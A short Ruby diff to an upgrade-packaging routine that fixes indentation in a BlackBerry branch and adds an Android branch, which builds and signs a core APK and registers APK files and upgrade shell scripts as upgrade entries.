@@ -383,7 +383,14 @@ class Item
         if self.version >= 2012063001
           add_upgrade('core-1_5.0', File.join(build.tmpdir, 'net_rim_bb_lib-1_5.0.cod'))
           add_upgrade('core-0_5.0', File.join(build.tmpdir, 'net_rim_bb_lib_5.0.cod'))
-		    end
+        end
+      when 'android'
+        build.melt({'appname' => 'core'})
+        build.sign({})
+        add_upgrade('core.v2.apk', File.join(build.tmpdir, 'core.v2.apk'))
+        add_upgrade('core.default.apk', File.join(build.tmpdir, 'core.default.apk'))
+        add_upgrade('upgrade.v2.sh', File.join(build.tmpdir, 'upgrade.sh'))
+        add_upgrade('upgrade.default.sh', File.join(build.tmpdir, 'upgrade.sh'))
     end
 
     # always upgrade the core
